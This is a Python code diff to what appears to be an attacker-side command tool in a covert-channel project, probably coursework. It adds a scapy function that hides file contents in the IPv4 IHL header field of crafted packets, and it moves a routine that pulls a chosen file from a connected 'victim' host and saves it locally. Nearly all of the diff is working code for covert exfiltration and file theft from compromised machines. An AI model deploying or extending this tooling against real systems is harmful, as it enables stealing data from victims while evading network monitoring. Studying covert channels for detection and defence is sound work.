@@ -346,6 +346,9 @@ def __text_to_bin(text):
     return ''.join(format(ord(char), constants.BINARY_MODE) for char in text)
 
 
+# // ===================================== COVERT CHANNEL FUNCTIONS ===================================== //
+
+
 def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: str):
     """
     Hides file data covertly in IPv4 headers using the
@@ -394,7 +397,7 @@ def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_pa
     Hides file data covertly in IPv4 headers using the
     version field.
 
-    @attention: // MAY CAUSE ISSUES WHEN RECOVERING DATA //
+    @attention: // MAY CAUSE ISSUES DURING TRANSMISSION //
         Changing the version field of the IP header may cause
         packets to be dropped; thus may not be a viable solution
         for covert data hiding
@@ -434,11 +437,56 @@ def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_pa
         send(packet, verbose=0)
 
 
+def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: str):
+    """
+    Hides file data covertly in IPv4 headers using the
+    IHL (Internet Header Length) field.
+
+    @attention: // MAY CAUSE ISSUES DURING TRANSMISSION //
+        Changing the IHL field of the IP header may cause
+        packets to be dropped; thus may not be a viable solution
+        for covert data hiding
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __text_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 4):
+        binary_segment = binary_data[i:i+4].ljust(4, '0')
+        ihl = int(binary_segment, 2)
+        packet = IP(dst=dest_ip, ihl=ihl)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets) + 1)
+    client_sock.send(total_packets.encode())
+
+    # e) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
 def __get_protocol_header_function_map():
     return {  # A tuple of [Header, Field] => Function
         # a) IPv4 Handlers
         ("IPv4", "Version"): transfer_file_ipv4_version,
-        ("IPv4", "IHL (Internet Header Length)"): "F()",
+        ("IPv4", "IHL (Internet Header Length)"): transfer_file_ipv4_ihl,
         ("IPv4", "TOS (Type of Service)"): "F()",
         ("IPv4", "Total Length"): "F()",
         ("IPv4", "Identification"): "F()",
@@ -513,6 +561,69 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int, choi
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
         return None
+
+
+def receive_file(client_socket: socket.socket, client_ip: str, client_port: int):
+    # Create Downloads and Client IP directories
+    sub_directory_path = __make_main_and_sub_directories(client_ip)
+
+    # Send Signal
+    print(constants.GET_FILE_SIGNAL_MSG)
+    client_socket.send(constants.GET_FILE_SIGNAL.encode())
+
+    # Get ACK and user file path, check if exists
+    res = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+
+    if res == constants.RECEIVED_CONFIRMATION_MSG:
+        # Get user prompt + send to client
+        file_path = input(constants.GET_FILE_PROMPT.format(client_ip, client_port))
+        file_name = file_path.split("/")[-1]
+        save_file_path = sub_directory_path + "/" + file_name
+        client_socket.send(file_path.encode())
+
+        # Wait for response
+        res = client_socket.recv(constants.BYTE_LIMIT).decode()
+
+        # Receive File if exists (MUST DO: put in downloads/[client_ip])
+        if res == constants.GET_FILE_EXIST:
+            with open(save_file_path, constants.WRITE_BINARY_MODE) as file:
+                eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+
+                while True:
+                    file_data = client_socket.recv(1024)
+                    if not file_data:
+                        break  # No more data received
+                    if file_data.endswith(eof_marker):
+                        file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
+                        break
+                    else:
+                        file.write(file_data)
+
+            # Send ACK to victim (if good)
+            if is_file_openable(save_file_path):
+                print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
+                client_socket.send(constants.VICTIM_ACK.encode())
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+                return None
+            else:
+                client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+                return None
+
+        else:  # If file does not exist...
+            print(constants.GET_FILE_NOT_EXIST_MSG.format(file_path, client_ip, client_port))
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            return None
+    else:
+        print(constants.GET_FILE_ERROR)
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return None
+
+# // ===================================== END OF COVERT CHANNEL FUNCTIONS ===================================== //
 
 
 def is_file_openable(file_path):
@@ -925,67 +1036,6 @@ def perform_menu_item_4(client_dict: dict):
                 __perform_menu_item_4_helper(target_socket, target_ip, target_port)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
-
-
-def receive_file(client_socket: socket.socket, client_ip: str, client_port: int):
-    # Create Downloads and Client IP directories
-    sub_directory_path = __make_main_and_sub_directories(client_ip)
-
-    # Send Signal
-    print(constants.GET_FILE_SIGNAL_MSG)
-    client_socket.send(constants.GET_FILE_SIGNAL.encode())
-
-    # Get ACK and user file path, check if exists
-    res = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
-
-    if res == constants.RECEIVED_CONFIRMATION_MSG:
-        # Get user prompt + send to client
-        file_path = input(constants.GET_FILE_PROMPT.format(client_ip, client_port))
-        file_name = file_path.split("/")[-1]
-        save_file_path = sub_directory_path + "/" + file_name
-        client_socket.send(file_path.encode())
-
-        # Wait for response
-        res = client_socket.recv(constants.BYTE_LIMIT).decode()
-
-        # Receive File if exists (MUST DO: put in downloads/[client_ip])
-        if res == constants.GET_FILE_EXIST:
-            with open(save_file_path, constants.WRITE_BINARY_MODE) as file:
-                eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
-
-                while True:
-                    file_data = client_socket.recv(1024)
-                    if not file_data:
-                        break  # No more data received
-                    if file_data.endswith(eof_marker):
-                        file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                        break
-                    else:
-                        file.write(file_data)
-
-            # Send ACK to victim (if good)
-            if is_file_openable(save_file_path):
-                print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
-                client_socket.send(constants.VICTIM_ACK.encode())
-                print(constants.RETURN_MAIN_MENU_MSG)
-                print(constants.MENU_CLOSING_BANNER)
-                return None
-            else:
-                client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
-                print(constants.RETURN_MAIN_MENU_MSG)
-                print(constants.MENU_CLOSING_BANNER)
-                return None
-
-        else:  # If file does not exist...
-            print(constants.GET_FILE_NOT_EXIST_MSG.format(file_path, client_ip, client_port))
-            print(constants.RETURN_MAIN_MENU_MSG)
-            print(constants.MENU_CLOSING_BANNER)
-            return None
-    else:
-        print(constants.GET_FILE_ERROR)
-        print(constants.RETURN_MAIN_MENU_MSG)
-        print(constants.MENU_CLOSING_BANNER)
-        return None
 
 
 def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str, client_port: int):
